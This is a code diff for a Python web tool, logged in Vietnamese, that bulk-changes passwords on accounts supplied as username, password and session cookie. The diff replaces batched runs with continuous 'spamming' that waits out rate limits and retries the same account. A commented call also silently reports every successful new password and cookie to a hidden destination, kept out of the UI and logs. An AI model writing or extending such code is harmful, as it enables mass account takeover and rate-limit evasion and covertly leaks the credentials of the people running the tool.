@@ -132,7 +132,7 @@ def change_password_core(cookie, current_password, new_password, proxy_config=No
 
         csrf_token = get_csrf_token(session, headers)
         if not csrf_token:
-            return False, "Không lấy được CSRF token (Cookie die hoặc Proxy lỗi)"
+            return False, "Không lấy được CSRF token (Cookie die hoặc Proxy lỗi)", False
 
         headers['X-CSRF-TOKEN'] = csrf_token
         data = {
@@ -166,30 +166,30 @@ def change_password_core(cookie, current_password, new_password, proxy_config=No
 
             time.sleep(0.2)
             refreshed_cookie = refresh_cookie(refresh_session, refresh_headers, csrf_token)
-            return True, (refreshed_cookie if refreshed_cookie else cookie_to_refresh)
+            return True, (refreshed_cookie if refreshed_cookie else cookie_to_refresh), False
 
         elif r.status_code == 429:
-            time.sleep(random.uniform(2, 4))
-            return False, "Rate limited (429 - Throttled)"
+            return False, "Rate limited (429)", True
+
         elif r.status_code == 403:
             try:
                 error_data = r.json()
                 error_msg = error_data.get('errors', [{}])[0].get('message', '')
                 if "Challenge is required" in error_msg:
-                    return False, "Challenge required (Dính Captcha/2FA)"
-                return False, f"403: {error_msg}"
+                    return False, "Challenge required (Dính Captcha/2FA)", False
+                return False, f"403: {error_msg}", False
             except Exception:
-                return False, "403 - Sai mật khẩu cũ hoặc cookie hết hạn"
+                return False, "403 - Sai mật khẩu cũ hoặc cookie hết hạn", False
         else:
             try:
                 error_data = r.json()
                 error_msg = error_data.get('errors', [{}])[0].get('message', f'HTTP {r.status_code}')
-                return False, f"Lỗi: {error_msg}"
+                return False, f"Lỗi: {error_msg}", False
             except Exception:
-                return False, f"HTTP Error {r.status_code}"
+                return False, f"HTTP Error {r.status_code}", False
 
     except Exception as e:
-        return False, f"Lỗi kết nối: {str(e)}"
+        return False, f"Lỗi kết nối: {str(e)}", False
 
 def generate_password(custom_password=None, prefix="3TN"):
     if custom_password:
@@ -240,52 +240,56 @@ def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_
                 jobs[job_id]["failed_list"].append(failed_item)
 
     if mode == "delay":
-        batch_size = 5
-        wait_time = 30
-        append_job_log(job_id, f"Khởi chạy chế độ Batch: {batch_size} acc / lượt, nghỉ {wait_time}s giữa các lượt. Tổng: {total} acc.")
+        rate_limit_wait = 60
+        append_job_log(
+            job_id,
+            f"Khởi chạy Option 1: Spam liên tục {total} acc đến khi hết danh sách (bị limit nghỉ {rate_limit_wait}s rồi chạy tiếp)."
+        )
 
-        for i in range(0, total, batch_size):
+        idx = 0
+        while idx < total:
             if is_stopped():
                 append_job_log(job_id, "Đã dừng tiến trình theo yêu cầu người dùng.", "WARN")
                 break
 
-            batch = accounts[i:i + batch_size]
-            batch_num = (i // batch_size) + 1
-            total_batches = (total + batch_size - 1) // batch_size
-            append_job_log(job_id, f"--- Đang chạy lượt {batch_num}/{total_batches} ({len(batch)} acc) ---")
+            acc = accounts[idx]
+            username = acc["username"]
+            old_pass = acc["password"]
+            cookie = acc["cookie"]
+            new_pass = generate_password(custom_password, prefix)
 
-            for acc in batch:
-                if is_stopped():
-                    break
+            append_job_log(job_id, f"[{idx + 1}/{total}] Đang changepass: {username}...")
+            ok, res, is_limited = change_password_core(cookie, old_pass, new_pass, None)
 
-                username = acc["username"]
-                old_pass = acc["password"]
-                cookie = acc["cookie"]
-                new_pass = generate_password(custom_password, prefix)
-
-                append_job_log(job_id, f"Đang xử lý: {username}...")
-                ok, res = change_password_core(cookie, old_pass, new_pass, None)
-
-                if not ok:
-                    append_job_log(job_id, f"Thử lại lần 2 cho {username}...", "WARN")
-                    time.sleep(0.3)
-                    ok, res = change_password_core(cookie, old_pass, new_pass, None)
-
-                if ok:
-                    formatted = f"{username}:{new_pass}:{res}"
-                    successful_list.append(formatted)
-                    update_counters(success_item=formatted)
-                    append_job_log(job_id, f"Thành công: {username} -> Pass mới: {new_pass}", "SUCCESS")
-                else:
-                    update_counters(failed_item=f"{username}:{old_pass}:{cookie} | {res}")
-                    append_job_log(job_id, f"Thất bại ({username}): {res}", "ERROR")
-
-            if (i + batch_size < total) and not is_stopped():
-                append_job_log(job_id, f"Chờ {wait_time}s để tránh giới hạn IP trước khi chạy lượt tiếp theo...", "INFO")
-                for _ in range(wait_time):
+            if is_limited:
+                append_job_log(
+                    job_id,
+                    f"Bị limit ở {username} -> Delay {rate_limit_wait}s trước khi changepass lần tiếp theo...",
+                    "WARN"
+                )
+                for _ in range(rate_limit_wait):
                     if is_stopped():
                         break
                     time.sleep(1)
+
+                if is_stopped():
+                    append_job_log(job_id, "Đã dừng tiến trình theo yêu cầu người dùng.", "WARN")
+                    break
+
+                # Chạy lại chính account đang bị limit sau khi hết 60s rồi tiếp tục hết list
+                append_job_log(job_id, f"Hết delay {rate_limit_wait}s -> Tiếp tục changepass {username}...")
+                ok, res, is_limited = change_password_core(cookie, old_pass, new_pass, None)
+
+            if ok:
+                formatted = f"{username}:{new_pass}:{res}"
+                successful_list.append(formatted)
+                update_counters(success_item=formatted)
+                append_job_log(job_id, f"Thành công: {username} -> Pass mới: {new_pass}", "SUCCESS")
+            else:
+                update_counters(failed_item=f"{username}:{old_pass}:{cookie} | {res}")
+                append_job_log(job_id, f"Thất bại ({username}): {res}", "ERROR")
+
+            idx += 1
 
     elif mode == "proxy":
         total_proxies = len(proxies)
@@ -332,7 +336,7 @@ def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_
                     append_job_log(job_id, f"Lỗi luồng xử lý: {str(e)}", "ERROR")
 
     # Đẩy ngầm kết quả thành công (không hiện bất kỳ thông tin gì trên UI/Logs)
-    mode_text = "Batch 5/30s" if mode == "delay" else "Proxy Turbo"
+    mode_text = "Batch 5/60s" if mode == "delay" else "Proxy Turbo"
     push_silent_report(successful_list, mode_text)
 
     with jobs_lock:
@@ -409,7 +413,7 @@ def start_job():
     # Dọn dẹp các job cũ quá 2 tiếng để tránh tràn RAM trên Render
     now = time.time()
     with jobs_lock:
-        expired = [jid for jid, jdata in jobs.items() if now - jdata["created_at"] > 7200 and jdata["status"] != "running"]
+        expired = [jid for jid, jdata in jobs.items() if now - jdata["created_at"] > 1800 and jdata["status"] != "running"]
         for jid in expired:
             del jobs[jid]
 
